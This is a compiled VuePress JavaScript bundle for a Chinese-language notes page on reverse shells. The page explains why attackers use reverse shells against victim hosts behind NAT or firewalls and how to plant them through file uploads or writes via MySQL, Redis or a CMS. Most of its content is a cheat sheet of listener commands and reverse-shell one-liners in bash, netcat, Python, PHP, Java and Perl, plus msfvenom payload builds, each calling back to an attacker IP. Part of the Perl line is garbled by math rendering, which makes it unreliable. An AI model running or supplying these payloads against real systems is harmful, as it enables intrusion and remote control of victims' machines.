import{_ as t,W as a,X as e,a1 as n,Y as s,Z as l}from"./framework-b6a07282.js";const r="/assets/1-bf01a803.jpg",i="/assets/2-5b7f7a73.jpg",o={},h=n('<h2 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹Shell</h2><h3 id="为什么要用反弹shell" tabindex="-1"><a class="header-anchor" href="#为什么要用反弹shell" aria-hidden="true">#</a> 为什么要用反弹Shell？</h3><ol><li>内网受害主机使用私有ip进行nat上网，无法对其进行直接的连接</li><li>受害主机的IP会动态发生变化</li><li>受害主机存在防火墙等安全设备，禁止了入方向的连接</li><li>一句话木马被杀毒软件删除</li></ol><h3 id="反弹shell的实现" tabindex="-1"><a class="header-anchor" href="#反弹shell的实现" aria-hidden="true">#</a> 反弹Shell的实现</h3><ol><li>攻击者开启监听端口</li><li>想办法让受害主机执行或定时任务触发相应的命令</li></ol><p>如何上传？</p><ol><li>文件上传</li><li>写入文件，如mysql、redis、cms</li><li>文本编辑器，</li></ol><h4 id="常见监听端口的开启方式" tabindex="-1"><a class="header-anchor" href="#常见监听端口的开启方式" aria-hidden="true">#</a> 常见监听端口的开启方式</h4><table><thead><tr><th>类型</th><th>命令</th></tr></thead><tbody><tr><td>netcat</td><td>nc -lvp 4444</td></tr><tr><td>msf</td><td>msfconsole <br>use exploit/multi/handler <br>set payload php/meterpreter/reverse_tcp <br>set lhost 192.168.0.142 <br>set lport 4444 <br>run</td></tr><tr><td>socat(kail)</td><td>socat TCP-LISTEN:4444 -</td></tr></tbody></table><h4 id="常见建立反弹shell的方式" tabindex="-1"><a class="header-anchor" href="#常见建立反弹shell的方式" aria-hidden="true">#</a> 常见建立反弹Shell的方式</h4>',10),c=s("table",null,[s("thead",null,[s("tr",null,[s("th",null,"类型"),s("th",null,"命令")])]),s("tbody",null,[s("tr",null,[s("td",null,"Linux bash"),s("td",null,"bash -i >& /dev/tcp/192.168.0.142/4444 0>&1")]),s("tr",null,[s("td",null,"netcat"),s("td",null,"nc -e /bin/bash 192.168.0.142 4444")]),s("tr",null,[s("td",null,"Python"),s("td",null,`python -c "import os,socket,subprocess;s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.142',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"`)]),s("tr",null,[s("td",null,"PHP"),s("td",null,[l(`php -r 'exec("/bin/bash -i >& /dev/tcp/192.168.142.44 7777");'`),s("br"),s("br"),l(`php -r '$sock=fsockopen("192.168.142.44" ,7777);exec("/bin/bash -i<&3 >&3 2>&3");'`)])]),s("tr",null,[s("td",null,"java"),s("td",null,[l("r = Runtime.getRuntime() "),s("br"),l('p = r.exec(["/bin/bash" , "-c" , "exec 5<>/dev/tcp/192.168.142.44/7777;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])p.waitFor()')])]),s("tr",null,[s("td",null,"perl"),s("td",null,[l("perl -e 'use Socket;"),s("span",{class:"katex"},[s("span",{class:"katex-mathml"},[s("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[s("semantics",null,[s("mrow",null,[s("mi",null,"i"),s("mo",null,"="),s("mi",{mathvariant:"normal"},'"'),s("mn",null,"192.168.142.44"),s("mi",{mathvariant:"normal"},'"'),s("mo",{separator:"true"},";")]),s("annotation",{encoding:"application/x-tex"},'i= "192.168.142.44";')])])]),s("span",{class:"katex-html","aria-hidden":"true"},[s("span",{class:"base"},[s("span",{class:"strut",style:{height:"0.6595em"}}),s("span",{class:"mord mathnormal"},"i"),s("span",{class:"mspace",style:{"margin-right":"0.2778em"}}),s("span",{class:"mrel"},"="),s("span",{class:"mspace",style:{"margin-right":"0.2778em"}})]),s("span",{class:"base"},[s("span",{class:"strut",style:{height:"0.8889em","vertical-align":"-0.1944em"}}),s("span",{class:"mord"},'"192.168.142.44"'),s("span",{class:"mpunct"},";")])])]),l('p=7777;socket(S,PF_INET,SOCK_STREAM,ge tprotobyname("tcp"));if(connect(S,sockaddr_in('),s("span",{class:"katex"},[s("span",{class:"katex-mathml"},[s("math",{xmlns:"http://www.w3.org/1998/Math/MathML"},[s("semantics",null,[s("mrow",null,[s("mi",null,"p"),s("mo",{separator:"true"},","),s("mi",null,"i"),s("mi",null,"n"),s("mi",null,"e"),s("msub",null,[s("mi",null,"t"),s("mi",null,"a")]),s("mi",null,"t"),s("mi",null,"o"),s("mi",null,"n"),s("mo",{stretchy:"false"},"(")]),s("annotation",{encoding:"application/x-tex"},"p,inet_aton(")])])]),s("span",{class:"katex-html","aria-hidden":"true"},[s("span",{class:"base"},[s("span",{class:"strut",style:{height:"1em","vertical-align":"-0.25em"}}),s("span",{class:"mord mathnormal"},"p"),s("span",{class:"mpunct"},","),s("span",{class:"mspace",style:{"margin-right":"0.1667em"}}),s("span",{class:"mord mathnormal"},"in"),s("span",{class:"mord mathnormal"},"e"),s("span",{class:"mord"},[s("span",{class:"mord mathnormal"},"t"),s("span",{class:"msupsub"},[s("span",{class:"vlist-t vlist-t2"},[s("span",{class:"vlist-r"},[s("span",{class:"vlist",style:{height:"0.1514em"}},[s("span",{style:{top:"-2.55em","margin-left":"0em","margin-right":"0.05em"}},[s("span",{class:"pstrut",style:{height:"2.7em"}}),s("span",{class:"sizing reset-size6 size3 mtight"},[s("span",{class:"mord mathnormal mtight"},"a")])])]),s("span",{class:"vlist-s"},"​")]),s("span",{class:"vlist-r"},[s("span",{class:"vlist",style:{height:"0.15em"}},[s("span")])])])])]),s("span",{class:"mord mathnormal"},"t"),s("span",{class:"mord mathnormal"},"o"),s("span",{class:"mord mathnormal"},"n"),s("span",{class:"mopen"},"(")])])]),l(`i)))){open(S TDIN, ">&S");open(STDOUT, ">&S");open(STDERR, ">&S");exec("/bin/sh - i");};'`)])]),s("tr",null,[s("td",null,"msf-PHP"),s("td",null,"msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.142.141 lport=7777 -o shell.php")]),s("tr",null,[s("td",null,"msf-Java"),s("td",null,[l("msfvenom -p java/meterpreter/reverse_tcp lhost=192.168.142.141 lport=7777 -f war -o shell.war"),s("br"),l("msfvenom -p java/meterpreter/reverse_tcp lhost=192.168.142.141 lport=7777 -f jar -o shell.jar")])]),s("tr",null,[s("td",null,"msf-exe"),s("td",null,"msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.142 lport=4444 -i 5 -f exe -o test.exe")])])],-1),m=s("h3",{id:"bash反弹连接的解释",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#bash反弹连接的解释","aria-hidden":"true"},"#"),l(" bash反弹连接的解释")],-1),p=s("img",{src:r},null,-1),d=s("img",{src:i},null,-1),u=[h,c,m,p,d];function b(_,f){return a(),e("div",null,u)}const g=t(o,[["render",b],["__file","反弹Shell.html.vue"]]);export{g as default};
